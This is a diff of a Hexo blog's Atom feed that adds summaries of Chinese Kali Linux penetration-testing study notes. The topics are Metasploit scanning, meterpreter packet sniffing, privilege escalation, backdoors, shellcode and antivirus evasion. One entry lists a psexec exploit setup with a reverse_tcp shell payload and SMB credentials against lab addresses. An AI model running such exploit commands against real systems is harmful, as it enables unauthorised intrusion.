@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-11-28T03:28:22.598Z</updated>
+  <updated>2020-12-11T08:56:57.905Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,379 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>后渗透阶段-嗅探、痕迹消除</title>
+    <link href="http://yoursite.com/2020/12/05/%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5-%E5%97%85%E6%8E%A2%E3%80%81%E7%97%95%E8%BF%B9%E6%B6%88%E9%99%A4/"/>
+    <id>http://yoursite.com/2020/12/05/%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5-%E5%97%85%E6%8E%A2%E3%80%81%E7%97%95%E8%BF%B9%E6%B6%88%E9%99%A4/</id>
+    <published>2020-12-05T08:55:37.000Z</published>
+    <updated>2020-12-11T08:56:57.905Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;抓包&quot;&gt;&lt;a href=&quot;#抓包&quot; class=&quot;headerlink&quot; title=&quot;抓包&quot;&gt;&lt;/a&gt;抓包&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;load sniffer&lt;/li&gt;
+&lt;li&gt;sniffer_interfaces&lt;/li&gt;
+&lt;li&gt;sniffer_start 2&lt;/li&gt;
+&lt;li&gt;sniffer_dump 2 1.cap /&lt;/li&gt;
+&lt;li&gt;在内存中缓存区块循环存储抓包，不写硬盘&lt;/li&gt;
+&lt;li&gt;智能过滤meterpreter流量，传输全程使用SSL/TLS加密&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+    
+      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>后渗透阶段-提权、后门、域渗透</title>
+    <link href="http://yoursite.com/2020/12/02/%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5-%E6%8F%90%E6%9D%83%E3%80%81%E5%90%8E%E9%97%A8%E3%80%81%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
+    <id>http://yoursite.com/2020/12/02/%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5-%E6%8F%90%E6%9D%83%E3%80%81%E5%90%8E%E9%97%A8%E3%80%81%E5%9F%9F%E6%B8%97%E9%80%8F/</id>
+    <published>2020-12-02T08:55:08.000Z</published>
+    <updated>2020-12-11T08:56:16.422Z</updated>
+    
+    <summary type="html">
+    
+      &lt;ul&gt;
+&lt;li&gt;&lt;p&gt;已经获得目标系统控制权后扩大战果&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;提权&lt;/li&gt;
+&lt;li&gt;信息收集&lt;/li&gt;
+&lt;li&gt;渗透内网&lt;/li&gt;
+&lt;li&gt;永久后门&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;基于已有session扩大战果&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
+    
+    </summary>
+    
+    
+      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>漏洞挖掘-静态代码分析</title>
+    <link href="http://yoursite.com/2020/12/01/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
+    <id>http://yoursite.com/2020/12/01/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/</id>
+    <published>2020-12-01T08:29:01.000Z</published>
+    <updated>2020-12-11T08:51:47.805Z</updated>
+    
+    <summary type="html">
+    
+      
+      
+        
+        
+          &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+
+&lt;h3 id=&quot;静态代码分析&quot;&gt;&lt;a href=&quot;#静态代码分析&quot; class=&quot;headerlink&quot;
+        
+      
+    
+    </summary>
+    
+    
+      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ShellCode编写</title>
+    <link href="http://yoursite.com/2020/11/30/ShellCode%E7%BC%96%E5%86%99/"/>
+    <id>http://yoursite.com/2020/11/30/ShellCode%E7%BC%96%E5%86%99/</id>
+    <published>2020-11-30T08:28:18.000Z</published>
+    <updated>2020-12-11T08:53:22.273Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;难点&quot;&gt;&lt;a href=&quot;#难点&quot; class=&quot;headerlink&quot; title=&quot;难点&quot;&gt;&lt;/a&gt;难点&lt;/h4&gt;&lt;ol&gt;
+&lt;li&gt;特殊字符需要转码。&lt;ul&gt;
+&lt;li&gt;比如strcpy等函数造成的缓冲区溢出，会认为NULL是字符串的终结，所以shellcode中不能有null，如果有则需要变通或编码。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;函数API定位很困难。&lt;ul&gt;
+&lt;li&gt;比如在windows系统下，系统调用多数都是封装在高级API中来调用的，而且不同的ServicePack或版本的操作系统其API都可能有所改动，所以不可能直接调用，因此需要采用动态的方法获取API地址。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+    
+    </summary>
+    
+    
+      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>MSF-扫描器和客户端渗透</title>
+    <link href="http://yoursite.com/2020/11/29/MSF-%E6%89%AB%E6%8F%8F%E5%99%A8%E5%92%8C%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/"/>
+    <id>http://yoursite.com/2020/11/29/MSF-%E6%89%AB%E6%8F%8F%E5%99%A8%E5%92%8C%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/</id>
+    <published>2020-11-29T08:19:23.000Z</published>
+    <updated>2020-12-11T08:53:07.022Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;扫描器扫描&quot;&gt;&lt;a href=&quot;#扫描器扫描&quot; class=&quot;headerlink&quot; title=&quot;扫描器扫描&quot;&gt;&lt;/a&gt;扫描器扫描&lt;/h4&gt;&lt;h5 id=&quot;Openvas（GVM）&quot;&gt;&lt;a href=&quot;#Openvas（GVM）&quot; class=&quot;headerlink&quot; title=&quot;Openvas（GVM）&quot;&gt;&lt;/a&gt;Openvas（GVM）&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;Load openvas&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;命令行模式，需要配置，使用繁琐&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;直接在opevas扫描，向msf导入nbe格式扫描日志&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;db_import openvas.nbe&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+    
+      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>MSF-弱点扫描</title>
+    <link href="http://yoursite.com/2020/11/28/MSF-%E5%BC%B1%E7%82%B9%E6%89%AB%E6%8F%8F/"/>
+    <id>http://yoursite.com/2020/11/28/MSF-%E5%BC%B1%E7%82%B9%E6%89%AB%E6%8F%8F/</id>
+    <published>2020-11-28T08:17:13.000Z</published>
+    <updated>2020-12-11T08:27:44.672Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;MSF-弱点扫描&quot;&gt;&lt;a href=&quot;#MSF-弱点扫描&quot; class=&quot;headerlink&quot; title=&quot;MSF-弱点扫描&quot;&gt;&lt;/a&gt;MSF-弱点扫描&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;根据信息收集结果搜索漏洞利用模块&lt;/li&gt;
+&lt;li&gt;结合外部漏洞扫描系统对大IP地址段进行批量扫描&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;VNC密码破解&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;5900端口&lt;/li&gt;
+&lt;li&gt;use auxiliary/scanner/vnc/vnc_login&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;VNC无密码访问&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;use auxiliary/scanner/vnc/vnc_none_auth&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;
+    
+    </summary>
+    
+    
+      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>MSF-信息收集、发现和端口扫描</title>
+    <link href="http://yoursite.com/2020/11/26/MSF-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E3%80%81%E5%8F%91%E7%8E%B0%E5%92%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
+    <id>http://yoursite.com/2020/11/26/MSF-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E3%80%81%E5%8F%91%E7%8E%B0%E5%92%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</id>
+    <published>2020-11-26T08:16:47.000Z</published>
+    <updated>2020-12-11T08:26:52.051Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;MSF–信息收集&quot;&gt;&lt;a href=&quot;#MSF–信息收集&quot; class=&quot;headerlink&quot; title=&quot;MSF–信息收集&quot;&gt;&lt;/a&gt;MSF–信息收集&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;Nmap扫描&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;db_nmap -sV 192.168.0.1/24&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Auxiliary扫描模块&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;主机发现&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;search arp&lt;/li&gt;
+&lt;li&gt;use auxiliary/scanner/discovery/arp_sweep&lt;/li&gt;
+&lt;li&gt;set INTERFACE RHOSTS SHOST SMAC THREADS &lt;/li&gt;
+&lt;li&gt;run&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;
+    
+    </summary>
+    
+    
+      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>MSF-exploit、payload、meterpreter、msfcli</title>
+    <link href="http://yoursite.com/2020/11/25/MSF-exploit%E3%80%81payload%E3%80%81meterpreter%E3%80%81msfcli/"/>
+    <id>http://yoursite.com/2020/11/25/MSF-exploit%E3%80%81payload%E3%80%81meterpreter%E3%80%81msfcli/</id>
+    <published>2020-11-25T08:24:43.000Z</published>
+    <updated>2020-12-11T08:25:42.923Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;Exploit&quot;&gt;&lt;a href=&quot;#Exploit&quot; class=&quot;headerlink&quot; title=&quot;Exploit&quot;&gt;&lt;/a&gt;Exploit&lt;/h4&gt;&lt;p&gt;以下两个用winserver2003测试成功。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;Active expolit&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;use exploit/windows/smb/psexec&lt;/li&gt;
+&lt;li&gt;set RHOST 1.1.1.14&lt;/li&gt;
+&lt;li&gt;set PAYLOAD windows/shell/reverse_tcp&lt;/li&gt;
+&lt;li&gt;set LHOST 1.1.1.10set LPORT 4444&lt;/li&gt;
+&lt;li&gt;set SMBUSER user1&lt;/li&gt;
+&lt;li&gt;set SMBPASS pass1&lt;/li&gt;
+&lt;li&gt;exploit&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Passive exploit&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;search ms07_017&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;
+    
+    </summary>
+    
+    
+      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>MSF-基本命令</title>
+    <link href="http://yoursite.com/2020/11/24/MSF-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/"/>
+    <id>http://yoursite.com/2020/11/24/MSF-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</id>
+    <published>2020-11-24T08:13:47.000Z</published>
+    <updated>2020-12-11T08:23:14.186Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;Metasploit&quot;&gt;&lt;a href=&quot;#Metasploit&quot; class=&quot;headerlink&quot; title=&quot;Metasploit&quot;&gt;&lt;/a&gt;Metasploit&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;目前最流行、最强大、最具拓展性的渗透测试平台软件&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;基于Metasploit进行渗透测试和漏洞分析的流程和方法&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;2003年由HD More发布第一版，2007年用ruby重写&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;集成了渗透测试标准（PETS）思想&lt;/li&gt;
+&lt;li&gt;一定程度上统一了渗透测试和漏洞研究的工作环境&lt;/li&gt;
+&lt;li&gt;新的攻击代码可以比较容易的加入框架&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;
+    
+    </summary>
+    
+    
+      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>免杀-Backdoorfactory</title>
+    <link href="http://yoursite.com/2020/11/23/%E5%85%8D%E6%9D%80-Backdoorfactory/"/>
+    <id>http://yoursite.com/2020/11/23/%E5%85%8D%E6%9D%80-Backdoorfactory/</id>
+    <published>2020-11-23T08:07:51.000Z</published>
+    <updated>2020-12-11T08:12:01.993Z</updated>
+    
+    <summary type="html">
+    
+      
+      
+        
+        
+          &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+
+&lt;h4 id=&quot;Backdoor-factory&quot;&gt;&lt;a href=&quot;#Backdoor-factory&quot; class=&quot;headerlink&quot;
+        
+      
+    
+    </summary>
+    
+    
+      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>免杀-Veil、shellter</title>
+    <link href="http://yoursite.com/2020/11/22/%E5%85%8D%E6%9D%80-Veil%E3%80%81shellter/"/>
+    <id>http://yoursite.com/2020/11/22/%E5%85%8D%E6%9D%80-Veil%E3%80%81shellter/</id>
+    <published>2020-11-22T08:09:59.000Z</published>
+    <updated>2020-12-11T08:11:24.803Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;Veil-evasion&quot;&gt;&lt;a href=&quot;#Veil-evasion&quot; class=&quot;headerlink&quot; title=&quot;Veil-evasion&quot;&gt;&lt;/a&gt;Veil-evasion&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;属于Veil-framework框架的一部分&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;由Python语言编写&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;用于自动生成免杀payload&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;集成msf payload，支持自定义payload&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;集成各种注入技术&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;集成各种第三方工具&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Hyperion、PEScrambler、BackDoor Factory&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;
+    
+    </summary>
+    
+    
+      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
   
   <entry>
     <title>免杀</title>
@@ -316,359 +689,6 @@
 &lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
-&lt;/ul&gt;
-    
-    </summary>
-    
-    
-      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>流量操控技术-rinetd、SSH</title>
-    <link href="http://yoursite.com/2020/11/10/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF-rinetd%E3%80%81SSH/"/>
-    <id>http://yoursite.com/2020/11/10/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF-rinetd%E3%80%81SSH/</id>
-    <published>2020-11-10T03:18:26.000Z</published>
-    <updated>2020-11-28T03:19:16.825Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;流量操控技术-Rinetd、SSH&quot;&gt;&lt;a href=&quot;#流量操控技术-Rinetd、SSH&quot; class=&quot;headerlink&quot; title=&quot;流量操控技术-Rinetd、SSH&quot;&gt;&lt;/a&gt;流量操控技术-Rinetd、SSH&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;Traffic manipulation technique&lt;/li&gt;
-&lt;li&gt;渗透测试中经常遇到访问受限的网络环境&lt;/li&gt;
-&lt;li&gt;使用隐蔽的手段逃避安全检查和朔源追踪&lt;/li&gt;
-&lt;li&gt;证明看似严格的访问控制仍然存在弱点&lt;/li&gt;
-&lt;li&gt;在非受信任的网络中实现安全的数据传输&lt;/li&gt;
-&lt;/ul&gt;
-    
-    </summary>
-    
-    
-      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>密码嗅探</title>
-    <link href="http://yoursite.com/2020/11/10/%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2/"/>
-    <id>http://yoursite.com/2020/11/10/%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2/</id>
-    <published>2020-11-10T03:16:11.000Z</published>
-    <updated>2020-11-28T03:17:30.205Z</updated>
-    
-    <summary type="html">
-    
-      &lt;p&gt;三层地址：IP 网络到网络&lt;/p&gt;
-&lt;p&gt;二层地址：MAC 主机到主机&lt;/p&gt;
-&lt;p&gt;交换机与HUB&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;HUB属于一层设备，全端口转发（不安全，共享带宽）&lt;/li&gt;
-&lt;li&gt;交换机根据学习地址转发&lt;/li&gt;
-&lt;/ul&gt;
-    
-    </summary>
-    
-    
-      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>密码破解</title>
-    <link href="http://yoursite.com/2020/11/09/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
-    <id>http://yoursite.com/2020/11/09/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</id>
-    <published>2020-11-09T03:15:12.000Z</published>
-    <updated>2020-11-28T03:15:54.798Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;在线密码破解&quot;&gt;&lt;a href=&quot;#在线密码破解&quot; class=&quot;headerlink&quot; title=&quot;在线密码破解&quot;&gt;&lt;/a&gt;在线密码破解&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;hydra&lt;/li&gt;
-&lt;li&gt;medusa&lt;/li&gt;
-&lt;/ul&gt;
-    
-    </summary>
-    
-    
-      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>https攻击-中间人攻击</title>
-    <link href="http://yoursite.com/2020/11/07/https%E6%94%BB%E5%87%BB-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
-    <id>http://yoursite.com/2020/11/07/https%E6%94%BB%E5%87%BB-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</id>
-    <published>2020-11-07T03:13:31.000Z</published>
-    <updated>2020-11-28T03:14:27.735Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;HTTPS攻击&quot;&gt;&lt;a href=&quot;#HTTPS攻击&quot; class=&quot;headerlink&quot; title=&quot;HTTPS攻击&quot;&gt;&lt;/a&gt;HTTPS攻击&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;全站https正成为潮流趋势&lt;ul&gt;
-&lt;li&gt;淘宝、百度&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;HTTPS的作用&lt;ul&gt;
-&lt;li&gt;CIA&lt;/li&gt;
-&lt;li&gt;解决的是信息传输过程中数据被篡改、窃取&lt;/li&gt;
-&lt;li&gt;加密：对称、非对称、单向&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;HTTPS攻击方法&lt;ul&gt;
-&lt;li&gt;降级攻击&lt;ul&gt;
-&lt;li&gt;将高强度算法降级为低强度算法&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;解密攻击（明文、证书伪造）&lt;/li&gt;
-&lt;li&gt;协议漏洞、https实现方法的漏洞、配置不严格&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-    
-    </summary>
-    
-    
-      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
